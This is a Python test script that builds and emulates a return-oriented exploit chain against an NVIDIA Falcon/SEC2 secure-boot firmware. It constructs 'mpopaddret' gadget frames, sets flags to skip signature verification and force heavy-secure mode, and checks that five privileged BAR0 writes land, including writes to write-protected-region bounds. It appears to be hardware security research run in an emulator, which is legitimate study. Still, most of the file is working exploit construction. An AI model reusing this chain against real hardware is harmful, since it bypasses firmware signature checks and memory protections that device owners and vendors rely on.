"""mpopaddret_test.py — Test the HS-mode mpopaddret hypothesis.

Uses the frame layout from Big Ptoughneigh's exploit notes:
  SP+0x08: val → x1
  SP+0x0C: addr → x0
  SP+0x14: RA (return address)
  SP += 0x18 to next frame

For each write:
  1. mpopaddret at entry (pops val→x1, addr→x0, RA=bar0_master)
  2. bar0_master (BAR0-master-write-gadget): sw x1, 0(x0)
  3. Self-chains to next mpopaddret via the next RA

The minimal test below places each "frame" + "BAR0-master gadget" inline,
so the chain is:
  IMEM[0x100]: mpopaddret   → bar0_master1
  IMEM[0x104]: bar0_master1: sw x1, 0(x0); j self    ← canaries, but for test we just loop
  ... etc.

DMEM[0xFF48]: frame 0 (CFG1)
  D[0xFF50] = 0x02669000   (val)
  D[0xFF54] = 0x9A0204     (addr)
  D[0xFF5C] = 0x5000104    (RA = bar0_master1)
DMEM[0xFF60]: frame 1 (LMR)
  ...

If the hypothesis is correct, all 5 BAR0 writes will be produced.
"""

import argparse
import logging
import struct
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tools.booter_emu import extract_booter_sections
from tools.booter_secure import FalconSecureBooter

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
log = logging.getLogger('mpopaddret_test')


def build_chain(writes, imem_base, frame_base, bar0_master_addr, imem_entry):
    """Build IMEM with mpopaddret chain + DMEM frames.

    Layout:
      IMEM[entry+0*4]: mpopaddret       (frame 0)
      IMEM[entry+1*4]: sw x1, 0(x10)    (bar0_master for frame 0)
      IMEM[entry+2*4]: mpopaddret       (frame 1)
      IMEM[entry+3*4]: sw x1, 0(x10)    (bar0_master for frame 1)
      ...
      IMEM[entry+2n*4]: jal x0, self   (raw exit)

    We use x10 for the BAR0 address because RISC-V x0 is hardwired
    to zero — the mpopaddret hypothesis pops val→x1 and addr→x10.
    """
    code = bytearray()
    n = len(writes)
    # SW x1, 0(x10) encoding (verified):
    #   bits [31:25]: imm[11:5] = 0
    #   bits [24:20]: rs2 = x1 = 1
    #   bits [19:15]: rs1 = x10 = 10
    #   bits [14:12]: funct3 = 2 (SW)
    #   bits [11:7]:  imm[4:0] = 0
    #   bits [6:0]:   opcode = 0x23 (STORE)
    # = 0000000_00001_01010_010_00000_0100011 = 0x00152023
    SW_X1_X10 = 0x00152023
    for i, (addr, value) in enumerate(writes):
        # mpopaddret (HS-mode 0x3b opcode — what we're testing)
        code += struct.pack('<I', 0x0000003b)
        # bar0_master gadget: SW x1, 0(x10)
        code += struct.pack('<I', SW_X1_X10)
    # After all writes: jal x0, self (raw HS exit)
    code += struct.pack('<I', 0x0000006f)

    # Build frames in DMEM
    frames = bytearray()
    for i, (addr, value) in enumerate(writes):
        frame = bytearray(0x18)  # one frame = 0x18 bytes
        # offset 0x00-0x07: zero (frame padding / r0/r1 slots)
        # offset 0x08-0x0B: val
        struct.pack_into('<I', frame, 0x08, value)
        # offset 0x0C-0x0F: addr
        struct.pack_into('<I', frame, 0x0C, addr)
        # offset 0x10-0x13: zero (saved_reg)
        # offset 0x14-0x17: RA → address of next instruction to run
        # Layout per frame:
        #   i=0: mpopaddret at 0x100, sw at 0x104
        #   i=1: mpopaddret at 0x108, sw at 0x10c
        #   ...
        # The sw for frame i is at index (i*2+1).
        # After the sw, fall through to the next mpopaddret at index ((i+1)*2).
        # After mpopaddret pops, PC=RA. The sw for THIS frame is
        # at index (i*2+1), and falls through to next mpopaddret.
        # For the last frame, RA points to its sw, which falls through
        # to the final jal.
        ra = imem_base + imem_entry + (i * 2 + 1) * 4
        struct.pack_into('<I', frame, 0x14, ra)
        frames += frame

    return bytes(code), bytes(frames)


def run_mpopaddret_test(firmware_path, max_steps=500_000):
    log.info('=== mpopaddret hypothesis test (HS-mode 0x3b) ===')

    sections = extract_booter_sections(firmware_path)
    if not sections:
        log.error('no .ga100_* sections found')
        return False

    # Community-verified write set
    writes = [
        (0x9A0204, 0x02669000, 'CFG1'),
        (0x100CE0, 0x0000028a, 'LMR'),
        (0x1FA824, 0x1FFFFE00, 'WPR2-lo'),
        (0x1FA828, 0x00000000, 'WPR2-hi'),
        (0x8403C4, 0x000000FF, 'resetPLM'),
    ]

    emu = FalconSecureBooter(
        sections,
        fuse_value_0x7ca=0,
        max_steps=max_steps,
        trace=False,
        hmac_bypass=True,   # exploit mode: skip signature verify
        auto_hs=True,       # exploit mode: enter HS for us
    )

    # Build the chain
    IMEM_ENTRY = 0x100
    IMEM_BASE = FalconSecureBooter.IMEM_BASE
    # Frame base needs to be inside DMEM (0x4000000-0x400FFFF).
    # 0xFF48 from the constants is from the Tegra X1 Falcon (16-bit SP).
    # For SEC2's 32-bit SP we use 0x400e000 which is near the top of DMEM.
    FRAME_BASE = 0x400e000 - (5 * 0x18)  # 5 frames × 24 bytes = 120 bytes
    FRAME_BASE = 0x400e000 - 0x200  # leave some room above the frames

    code, frames = build_chain(
        [(a, v) for a, v, _ in writes],
        imem_base=IMEM_BASE,
        frame_base=FRAME_BASE,
        bar0_master_addr=IMEM_BASE + IMEM_ENTRY + 4,
        imem_entry=IMEM_ENTRY,
    )

    # Load code into IMEM
    code_off = IMEM_BASE + IMEM_ENTRY
    emu.imem[IMEM_ENTRY:IMEM_ENTRY + len(code)] = code

    # Load frames into DMEM
    emu.mem[FRAME_BASE - FalconSecureBooter.MEM_BASE:FRAME_BASE - FalconSecureBooter.MEM_BASE + len(frames)] = frames

    # Set up the test:
    emu.regs[2] = FRAME_BASE           # SP = frame_start
    emu.pc = code_off                  # PC at first mpopaddret
    emu.enter_hs()                     # already auto, but explicit

    log.info('loaded %d bytes of code at IMEM[0x%x]', len(code), IMEM_ENTRY)
    log.info('loaded %d bytes of frames at DMEM[0x%x]', len(frames), FRAME_BASE)
    log.info('PC=0x%x, SP=0x%x, HS=ON', emu.pc, emu.regs[2])

    emu.run()

    log.info('=== run finished ===')
    log.info('steps: %d  halted: %s  reason: %s',
             emu.steps, emu.halted, emu.halt_reason)
    log.info('BAR0 writes: %d total', len(emu.bar0_writes))

    # Build last-write map
    last = {}
    for a, v, pc in emu.bar0_writes_pcs:
        last[a] = v

    print()
    print('=== mpopaddret hypothesis verification ===')
    all_ok = True
    for addr, exp_val, label in writes:
        got = last.get(addr)
        if got is None:
            mark, got_str = 'FAIL', 'absent'
            all_ok = False
        elif got == exp_val:
            mark, got_str = 'OK  ', f'0x{got:08x}'
        else:
            mark, got_str = 'FAIL', f'0x{got:08x}'
            all_ok = False
        print(f'  [{mark}] {label:10s} 0x{addr:08x} <- 0x{exp_val:08x}  (got {got_str})')
    print()
    print('=== overall:', 'PASS' if all_ok else 'FAIL', '===')
    return all_ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('firmware', help='Path to gsp_tu10x.bin')
    ap.add_argument('--max-steps', type=int, default=500_000)
    args = ap.parse_args()
    ok = run_mpopaddret_test(args.firmware, args.max_steps)
    sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()